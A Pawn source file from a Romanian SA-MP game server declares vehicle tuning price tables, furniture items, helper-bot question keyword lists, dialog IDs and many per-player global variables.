// TUNNING SYSTEM
#define	DIALOG_MOTOR 834
new InTunning[MAX_PLAYERS];
#define	DIALOG_SPOILERE 833
new PlayerText:TuningBuy[ MAX_PLAYERS ][15];
new PlayerText:TuneTD[20];
enum PaintjobInfi 
{
	vehTID,
	pNumber,
	pPrice,
	pName[12]
};
#define NUMBER_TYPE_PAINTJOB 	36
static const
	pjInfo[ NUMBER_TYPE_PAINTJOB ][ PaintjobInfi ] = {
	{ 483, 0, 10000, "Paintjob 1" },
	{ 534, 0, 10000, "Paintjob 1" },
	{ 534, 1, 15000, "Paintjob 2" },
	{ 534, 2, 20000, "Paintjob 3" },
	{ 535, 0, 10000, "Paintjob 1" },
	{ 535, 1, 15000, "Paintjob 2" },
	{ 535, 2, 20000, "Paintjob 3" },
	{ 536, 0, 10000, "Paintjob 1" },
	{ 536, 1, 15000, "Paintjob 2" },
	{ 536, 2, 20000, "Paintjob 3" },
	{ 558, 0, 10000, "Paintjob 1" },
	{ 558, 1, 15000, "Paintjob 2" },
	{ 558, 2, 20000, "Paintjob 3" },
	{ 559, 0, 10000, "Paintjob 1" },
	{ 559, 1, 15000, "Paintjob 2" },
	{ 559, 2, 20000, "Paintjob 3" },
	{ 560, 0, 10000, "Paintjob 1" },
	{ 560, 1, 15000, "Paintjob 2" },
	{ 560, 2, 20000, "Paintjob 3" },
	{ 561, 0, 10000, "Paintjob 1" },
	{ 561, 1, 15000, "Paintjob 2" },
	{ 561, 2, 20000, "Paintjob 3" },
	{ 562, 0, 10000, "Paintjob 1" },
	{ 562, 1, 15000, "Paintjob 2" },
	{ 562, 2, 20000, "Paintjob 3" },
	{ 565, 0, 10000, "Paintjob 1" },
	{ 565, 1, 15000, "Paintjob 2" },
	{ 565, 2, 20000, "Paintjob 3" },
	{ 567, 0, 10000, "Paintjob 1" },
	{ 567, 1, 15000, "Paintjob 2" },
	{ 567, 2, 20000, "Paintjob 3" },
	{ 575, 0, 10000, "Paintjob 1" },
	{ 575, 1, 15000, "Paintjob 2" },
	{ 576, 0, 10000, "Paintjob 1" },
	{ 576, 1, 15000, "Paintjob 2" },
	{ 576, 2, 20000, "Paintjob 3" }
};

enum ComponentsInfo {
	cID,
	cName[ 40 ],
	cPrice,
	cType
};
#define MAX_COMPONENTS	194
static const
	cTInfo[ MAX_COMPONENTS ][ ComponentsInfo ] = {
	{ 1000, "Pro Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1001, "Win Spoiler", 25000, CARMODTYPE_SPOILER },
	{ 1002, "Drag Spoiler", 30000, CARMODTYPE_SPOILER },
	{ 1003, "Alpha Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1004, "Champ Scoop Hood", 30000, CARMODTYPE_HOOD },
	{ 1005, "Fury Scoop Hood", 30000, CARMODTYPE_HOOD },
	{ 1006, "Roof Scoop Roof", 10000, CARMODTYPE_ROOF },
	{ 1007, "Right Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1008, "5x Nitrous", 10000, CARMODTYPE_NITRO },
	{ 1009, "2x Nitrous", 5000, CARMODTYPE_NITRO },
	{ 1010, "10x Nitrous", 25000, CARMODTYPE_NITRO },
	{ 1011, "Race Scoop Hood", 30000, CARMODTYPE_HOOD },
	{ 1012, "Worx Scoop Hood", 30000, CARMODTYPE_HOOD },
	{ 1013, "Round Fog Lamp", 9000, CARMODTYPE_LAMPS },
	{ 1014, "Champ Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1015, "Race Spoiler", 30000, CARMODTYPE_SPOILER },
	{ 1016, "Worx Spoiler", 30000, CARMODTYPE_SPOILER },
	{ 1017, "Left Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1018, "Upswept Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1019, "Twin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1020, "Large Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1021, "Medium Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1022, "Small Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1023, "Fury Spoiler", 25000, CARMODTYPE_SPOILER },
	{ 1024, "Square Fog Lamp", 9000, CARMODTYPE_LAMPS },
	{ 1025, "Offroad Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1026, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1027, "Left Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1028, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1029, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1030, "Left X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1031, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1032, "Alien Roof Vent", 10000, CARMODTYPE_ROOF },
	{ 1033, "X-Flow Roof Vent", 10000, CARMODTYPE_ROOF },
	{ 1034, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1035, "X-Flow Roof Vent", 10000, CARMODTYPE_ROOF },
	{ 1036, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1037, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1038, "Alien Roof Vent", 10000, CARMODTYPE_ROOF },
	{ 1039, "Left X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1040, "Left Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1041, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1042, "Right Chrome Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1043, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1044, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1045, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1046, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1047, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1048, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1049, "Alien Spoiler", 15000, CARMODTYPE_SPOILER },
	{ 1050, "X-Flow Spoiler", 30000, CARMODTYPE_SPOILER },
	{ 1051, "Left Alien Sideskirt", 20000, CARMODTYPE_SPOILER },
	{ 1052, "Left X-Flow Sideskirt", 18000, CARMODTYPE_SPOILER },
	{ 1053, "X-Flow Roof", 10000, CARMODTYPE_ROOF },
	{ 1054, "Alien Roof", 10000, CARMODTYPE_ROOF },
	{ 1055, "Alien Roof", 10000, CARMODTYPE_ROOF },
	{ 1056, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1057, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1058, "Alien Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1059, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1060, "X-Flow Spoiler",20000, CARMODTYPE_SPOILER },
	{ 1061, "X-Flow Roof", 10000, CARMODTYPE_ROOF },
	{ 1062, "Left Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1063, "Left X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1064, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1065, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1066, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1067, "Alien Roof", 10000, CARMODTYPE_ROOF },
	{ 1068, "X-Flow Roof", 10000, CARMODTYPE_ROOF },
	{ 1069, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1070, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1071, "Left Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1072, "Left X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1073, "Shadow Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1074, "Mega Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1075, "Rimshine Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1076, "Wires Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1077, "Classic Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1078, "Twist Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1079, "Cutter Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1080, "Switch Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1081, "Grove Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1082, "Import Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1083, "Dollar Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1084, "Trance Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1085, "Atomic Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1086, "Stereo Wheels", 10000, CARMODTYPE_STEREO },
	{ 1087, "Hydraulics", 10000, CARMODTYPE_HYDRAULICS },
	{ 1088, "Alien Roof", 10000, CARMODTYPE_ROOF },
	{ 1089, "X-Flow Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1090, "Right Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1091, "X-Flow Roof", 10000, CARMODTYPE_ROOF },
	{ 1092, "Alien Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1093, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1094, "Left Alien Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1095, "Right X-Flow Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1096, "Ahab Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1097, "Virtual Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1098, "Access Wheels", 40000, CARMODTYPE_WHEELS },
	{ 1099, "Left Chrome Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1100, "Chrome Grill", 10000, -1 }, // Bullbar
	{ 1101, "Left `Chrome Flames` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1102, "Left `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1103, "Covertible Roof", 10000, CARMODTYPE_ROOF },
	{ 1104, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1105, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1106, "Right `Chrome Arches`", 40000, CARMODTYPE_SIDESKIRT },
	{ 1107, "Left `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1108, "Right `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1109, "Chrome", 10000, -1 }, // Bullbar
	{ 1110, "Slamin", 10000, -1 }, // Bullbar
	{ 1111, "Little Sign?", 10000, -1 }, // sig
	{ 1112, "Little Sign?", 10000, -1 }, // sig
	{ 1113, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1114, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1115, "Chrome", 10000, -1 }, // Bullbar
	{ 1116, "Slamin", 10000, -1 }, // Bullbar
	{ 1117, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1118, "Right `Chrome Trim` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1119, "Right `Wheelcovers` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1120, "Left `Chrome Trim` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1121, "Left `Wheelcovers` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1122, "Right `Chrome Flames` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1123, "Bullbar Chrome Bars", 10000, -1 }, // Bullbar
	{ 1124, "Left `Chrome Arches` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1125, "Bullbar Chrome Lights", 10000, -1 }, // Bullbar
	{ 1126, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1127, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1128, "Vinyl Hardtop", 10000, CARMODTYPE_ROOF },
	{ 1129, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1130, "Hardtop Roof", 10000, CARMODTYPE_ROOF },
	{ 1131, "Softtop Roof", 10000, CARMODTYPE_ROOF },
	{ 1132, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1133, "Right `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1134, "Right `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1135, "Slamin Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1136, "Chrome Exhaust", 35000, CARMODTYPE_EXHAUST },
	{ 1137, "Left `Chrome Strip` Sideskirt", 40000, CARMODTYPE_SIDESKIRT },
	{ 1138, "Alien Spoiler", 30000, CARMODTYPE_SPOILER },
	{ 1139, "X-Flow Spoiler", 28000, CARMODTYPE_SPOILER },
	{ 1140, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1141, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1142, "Left Oval Vents", 15000, CARMODTYPE_VENT_LEFT },
	{ 1143, "Right Oval Vents", 10000, CARMODTYPE_VENT_RIGHT },
	{ 1144, "Left Square Vents", 15000, CARMODTYPE_VENT_LEFT },
	{ 1145, "Right Square Vents", 10000, CARMODTYPE_VENT_RIGHT },
	{ 1146, "X-Flow Spoiler", 25000, CARMODTYPE_SPOILER },
	{ 1147, "Alien Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1148, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1149, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1150, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1151, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1152, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1153, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1154, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1155, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1156, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1157, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1158, "X-Flow Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1159, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1160, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1161, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1162, "Alien Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1163, "X-Flow Spoiler", 15000, CARMODTYPE_SPOILER },
	{ 1164, "Alien Spoiler", 20000, CARMODTYPE_SPOILER },
	{ 1165, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1166, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1167, "X-Flow Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1168, "Alien Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1169, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1170, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1171, "Alien Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1172, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1173, "X-Flow Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1174, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1175, "Slamin Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1176, "Chrome Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1177, "Slamin Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1178, "Slamin Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1179, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1180, "Chrome Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1181, "Slamin Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1182, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1183, "Slamin Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1184, "Chrome Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1185, "Slamin Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1186, "Slamin Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1187, "Chrome Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1188, "Slamin Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1189, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1190, "Slamin Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1191, "Chrome Front Bumper", 60000, CARMODTYPE_FRONT_BUMPER },
	{ 1192, "Chrome Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER },
	{ 1193, "Slamin Rear Bumper", 60000, CARMODTYPE_REAR_BUMPER }
};
enum tpi 
{
	tID,
	tType,
	bool:tPaintjob,
	PJColor[ 2 ]
};
new TPInfo[MAX_PLAYERS][tpi];

new globalstring[128];
// SISTEM UPDATEURI
new updateversiune[100][128];
new updatedata[100][128];
new updatetext[40][100][1000];
#define	DIALOG_UPDATES 830
// ACTORI
new actorrw;
// FLYMODE
static bool:OnFly[MAX_PLAYERS];

forward InitFly(playerid);
forward bool:StartFly(playerid);
forward bool:StopFly(playerid);
forward static SetPlayerLookAt(playerid,Float:x,Float:y);
// REFUEL TIMER
new RefuelTime[MAX_PLAYERS];
//LOCATII PERSONALIZATE
new Float:GPSXYZ[11][3][MAX_PLAYERS];
new PGPS[11][MAX_PLAYERS];
#define DIALOG_LOCATIIPERSONALIZATE 825
//KILOMETRAJ
new PlayerText:TDKM[MAX_PLAYERS][5];
//SECURITATE
new timercuvantcheie[MAX_PLAYERS];
#define	 DIALOG_SECURITATE2 824
#define	 DIALOG_SECURITATE1 823
new securitatenr[MAX_PLAYERS];
new Securitate[MAX_PLAYERS];
new PlayerText:SecuritateTD[MAX_PLAYERS][9];
//RACING SYSTEM
new timercursa = -1;
new pozitiedrag = 0;
new racingcar[MAX_PLAYERS];
//FUN AREA
#define	DIALOG_FUNAREA	822
//ANTI GOOD OF CAR
 new p_ac[MAX_PLAYERS]; 
 //
 //STERGEREA APLICATIEI
#define DIALOG_AIAPLICATIE  821
//MASINI IMPERFECTE
#define	DIALOG_MASINIIMPERFECTE 820 
// DealerShip new functions.
new pozitienoua = 0;
new DSCAR[MAX_PLAYERS];
new vcol1[MAX_PLAYERS];
new vcol2[MAX_PLAYERS];
// DealerShip MAP # 1.
new Vidro[7];
new Piso[7];
new TexturaC[8];
new Textura0[73];
new Textura2[41];
new Textura3[36];
new gPlayerCitySelection[MAX_PLAYERS];
new gPlayerHasCitySelected[MAX_PLAYERS];
new gPlayerLastCitySelectionTick[MAX_PLAYERS];
//SISTEM DE ATM
new incarcaatmtimer = -1;
new ultimulatm = 0;
forward incarcaATM();
//ENUM ATM
enum ATMURI
{
	ID,
	Float:PozitieATM[4],
}
new ATM[100][ATMURI];
new ObjectATM[sizeof(ATM)];
new Text3D: TabeleATM[sizeof(ATM)];
new accestransfer[MAX_PLAYERS];
#define  DIALOG_RETRAGERE 801
new PlayerText:ATMTD[MAX_PLAYERS][12];
new esteinATM[MAX_PLAYERS];
new atminterogare[MAX_PLAYERS];
new atmretragere[MAX_PLAYERS];
new atmtransfer[MAX_PLAYERS];
//DEALERSHIP NOU
new esteinds[MAX_PLAYERS];
new PlayerText:DealerShipTD[MAX_PLAYERS][24];
//APLICATII DIN JOC.
new wait5sec[MAX_PLAYERS];
#define DIALOG_APLICATIE 723
#define DIALOG_APLICATII 722
new raspunsfactiune9[MAX_PLAYERS][1000];
new raspunsfactiune8[MAX_PLAYERS][1000];
new raspunsfactiune7[MAX_PLAYERS][1000];
new raspunsfactiune6[MAX_PLAYERS][1000];
new raspunsfactiune5[MAX_PLAYERS][1000];
new raspunsfactiune4[MAX_PLAYERS][1000];
new raspunsfactiune3[MAX_PLAYERS][1000];
new raspunsfactiune2[MAX_PLAYERS][1000];
new raspunsfactiune[MAX_PLAYERS][1000];
new appfactiune[MAX_PLAYERS];
#define DIALOG_APLICAQ11    721
#define DIALOG_APLICAQ10    720
#define DIALOG_APLICAQ9 719
#define DIALOG_APLICAQ8 718
#define DIALOG_APLICAQ7 717
#define DIALOG_APLICAQ6 716
#define DIALOG_APLICAQ5 715
#define DIALOG_APLICAQ4 714
#define DIALOG_APLICAQ3 713
#define DIALOG_APLICAQ2 712
#define DIALOG_APLICAQ 711
#define DIALOG_APLICA 710
//BONUSURI
#define DIALOG_BONUSURI 800
new citeste10sec[MAX_PLAYERS];
//BUG FREE
new freetimer[MAX_PLAYERS];
//SYSTEM BOTI
new botmember[MAX_PLAYERS];
//SYSTEM MOBILA.
#define     INVALID_HOUSE_ID    (-1)
#define     DIALOG_HOUSE        (7500)
#define     SELECT_MODE_EDIT    (0)
#define     SELECT_MODE_SELL    (1)
new SelectMode[MAX_PLAYERS] = {SELECT_MODE_EDIT, ...};
//ENUM MOBILA SI ALTELE
enum e_furnituredata
{
	ModelID,
	Name3[64],
	Price
};
new
	HouseFurnitures[][e_furnituredata] = {
	// modelid, furniture name, price
	    {1641, "Covor", 1000},
	    {2894, "Carte", 1500},
	    {2277, "Tablou", 2500},
	    {1753, "Canapea de piele", 50000},
	    {1703, "Canapea neagra", 45000},
	    {1255, "Sezlong", 70500},
	    {19581, "Tigaie", 5000},
	    {19584, "Oala", 7000},
	    {19590, "Sabie", 100000},
	    {19525, "Tort", 35000},
	    {1742, "Biblioteca", 105000},
	    {1518, "TV", 130000},
	    {19609, "Tobe", 50000},
		{19787, "LCD TV 80 CM", 57000},
		{19786, "LCD TV 160 CM", 74000},
		{1819, "Masa", 60000},
		{2125, "Scaun", 30000},
		{1798, "Dormitor", 102000},
		{1208, "Masina de spalat rufe", 700000},
		{1825, "Masa cu scaune", 60050},
		{2198, "Computer (inclusiv birou)", 70009},
		{1715, "Scaun de Birou", 51000},
		{1727, "Fotoliu de piele", 80000},
		{1827, "Masuta de sticla", 9000},
		{2499, "Poster", 8000},
		{19054, "Cadou de craciun", 14000},
		{19893, "Laptop", 12500},
		{19916, "Frigider", 9009},
		{19933, "Aragaz", 80007},
		{19927, "Chiuveta de bucatarie", 50003},
		{19929, "Mobila de bucatarie (Dreptunghica)", 200001},
		{19930, "Mobila de bucatarie (Patrata)", 100002},
		{19923, "Cuptor de bucatarie", 600007},
		{1502, "Usa", 100000},
		{1359, "Cos de gunoi", 600000},
		{2627, "Banda de alergat", 320000}
};
//forward LoadFurnitures();
enum e_furniture
{
	SQLID,
	HouseIDF,
	ArrayID,
	Float: furnitureX,
	Float: furnitureY,
	Float: furnitureZ,
	Float: furnitureRX,
	Float: furnitureRY,
	Float: furnitureRZ
};
//SERVER BONUS
new afolositgetpp[MAX_PLAYERS];
new stockpp = 0;
new stockvip = 0;
new sumapp = 0;

//TIMERS BUGS & PayDay bug!
new synctimerr = 0;
new savedatatimerr = 0;
new paydayacordat = 0;
//BUG /ad - rezolvat.
new secundepanalaad[MAX_PLAYERS];
//SYSTEM DE BONUS
#define DIALOG_USEBGAMEACCOUNT 701
#define DIALOG_USEBGAMEACCOUNTPASS 702
new adaugarebonus[MAX_PLAYERS];
// Textdraw-uri de la Logo.
new Text:Logosv1;
new Text:Logosv2;
//STRING GLOBAL.
new MGLOBAL[3200];
//SYSTEM HELPERI
#define DIALOG_HSHOP 700
new lastquestion[MAX_PLAYERS];
new timefornextquestion[MAX_PLAYERS];
new aprimitintrebarea[MAX_PLAYERS];
//SYSTEM HELPERI AVANSAT
static const intrebarejob[][] = {
 "cel mai bun job?",
 "cel mai platit job?",
 "cel mai platit job",
 "cel mai bine platit job?",
 "cel mai bine platit job",
 "cel mai bun job",
 "cel mai profitabil job",
 "care este cel mai bun job",
 "care este cel mai profitabil job"
};
static const intrebarejob2[][] = {
 "cum iau un job?",
 "cum iau un job",
 "cum pot achizitiona un job?",
 "cum pot achizitiona un job",
 "cum pot lua un job?",
 "cum pot lua un job",
 "ce tastez sa iau un job?",
 "ce tastez sa iau un job"
};
static const intrebarestaff[][] = {
 "cum vad lideri?",
 "cum vad lideri",
 "cum pot vedea lideri?",
 "cum pot vedea lideri",
 "cum pot vedea liderii?",
 "cum pot vedea liderii",
 "cum accesez lista cu lideri?",
 "cum accesez lista cu lideri",
 "cum pot accesa lista cu lideri?",
 "cum pot accesa lista cu lideri",
 "cum pot accesa lista cu liderii?",
 "cum pot accesa lista cu liderii",
 "cum vad lista cu lideri?",
 "cum vad lista cu lideri",
 "cum vad lista cu liderii?",
 "cum vad lista cu liderii",

 "cum vad admini?",
 "cum vad admini",
 "cum pot vedea admini?",
 "cum pot vedea admini",
 "cum pot vedea adminii?",
 "cum pot vedea adminii",
 "cum accesez lista cu admini?",
 "cum accesez lista cu admini",
 "cum pot accesa lista cu admini?",
 "cum pot accesa lista cu admini",
 "cum pot accesa lista cu adminii?",
 "cum pot accesa lista cu adminii",
 "cum vad lista cu admini?",
 "cum vad lista cu admini",
 "cum vad lista cu adminii?",
 "cum vad lista cu adminii",

 "cum vad helperi?",
 "cum vad helperi",
 "cum pot vedea helperi?",
 "cum pot vedea helperi",
 "cum pot vedea helperii?",
 "cum pot vedea helperii",
 "cum accesez lista cu helperi?",
 "cum accesez lista cu helperi",
 "cum pot accesa lista cu helperi?",
 "cum pot accesa lista cu helperi",
 "cum pot accesa lista cu helperii?",
 "cum pot accesa lista cu helperii",
 "cum vad lista cu helperi?",
 "cum vad lista cu helperi",
 "cum vad lista cu helperii?",
 "cum vad lista cu helperii"
};
static const intrebarejefuire[][] = {
 "cum pot jefui?",
 "cum pot jefui",
 "cum pot jefuii?",
 "cum pot jefuii",
 "cum pot jefuii o afacere?",
 "cum pot jefuii o afacere",
 "cum pot jefui o afacere?",
 "cum pot jefui o afacere",
 "cum jefuiesc banca",
 "cum jefuiesc banca?",
 "cum pot sa jefuiesc banca?",
 "cum pot sa jefuiesc banca",
 "pot sa jefuiesc banca",
 "pot sa jefuiesc banca?",
 "cum jefuiesc o banca",
 "cum jefuiesc o banca?",
 "cum pot sa jefuiesc o banca?",
 "cum pot sa jefuiesc o banca"
};
static const antisqlinjection[][] =
{
	"'",
	"#",
	"`",
 	"%"
};
#define DIALOG_RASPUNSAUTON 655
// VARIABILE
new SQL = -1;
new BonusActiv = 0,
	GiftBoxActiv = 1,
	PremiumMaxim = 0,
	Float:GiftPosX =  420.7226,
	Float:GiftPosY = -1557.0850,
	Float:GiftPosZ = 27.5781,
	giftboxobject,
	Text3D:giftbox3DText,
	DeathP[MAX_PLAYERS],
	LastText[MAX_PLAYERS][128],
	LastTextTime[MAX_PLAYERS],
	masinispawnate[MAX_PLAYERS] = 0,
	examcar[MAX_PLAYERS],
	pizzacar[MAX_PLAYERS],
	LastBiz[MAX_PLAYERS],
	countdown,
	Tigaanel[MAX_PLAYERS],
	LastPlayer[MAX_PLAYERS],
	Selectat[1000][MAX_PLAYERS],
	XCheckpoints[MAX_PLAYERS],
	LastCheckpoint[MAX_PLAYERS],
	Selected[MAX_PLAYERS][101],
	Selected2[MAX_PLAYERS],
	spawnsetarea[MAX_PLAYERS],
    activateareagun = 0,
    eventareatankk = 0,
	FastString[128],
	AdvMSG[MAX_PLAYERS][256],
	AdvPlayer[MAX_PLAYERS],
	Answered = 1,
	restruck[MAX_PLAYERS],
	viddd[MAX_PLAYERS],
	Trucker[MAX_PLAYERS],
	Trucker2[MAX_PLAYERS],
	Trucker3[MAX_PLAYERS],
	Trucker4[MAX_PLAYERS],
	TruckID[MAX_PLAYERS],
	OnDutymedic[MAX_PLAYERS],
	RepairTime[MAX_PLAYERS],
	pnsmoney[MAX_PLAYERS],
	AreFaina[MAX_PLAYERS],
	CarJacker[MAX_PLAYERS],
	BuyCar[MAX_PLAYERS],
	IsPlayerAFK[MAX_PLAYERS],
	ticketgivened[MAX_PLAYERS],
	QEvent[MAX_PLAYERS][51],
	object,
	object2,
	object3,
	object4,
	object5,
	iGMXTick,
	iGMXTimer,
	VehicleRent[MAX_VEHICLES],
	RentTime[MAX_PLAYERS],
	TotalTimeRent[MAX_PLAYERS],
	RentVeh[MAX_PLAYERS],
	RentTimerr[MAX_PLAYERS],
	waitwar[15],
	SelFac[MAX_PLAYERS],
	EnterInModShop[MAX_PLAYERS],
	PlayerEnterTime[MAX_PLAYERS],
	Undercover[MAX_PLAYERS],
	shotTime[MAX_PLAYERS],
	shot[MAX_PLAYERS],
	Float:xhq[16],
	Float:yhq[16],
	Float:zhq[16],
	WantedName[MAX_PLAYERS][256],
	WantedReason[MAX_PLAYERS],
	WantedTimer[MAX_PLAYERS],
	skinlist = mS_INVALID_LISTID,
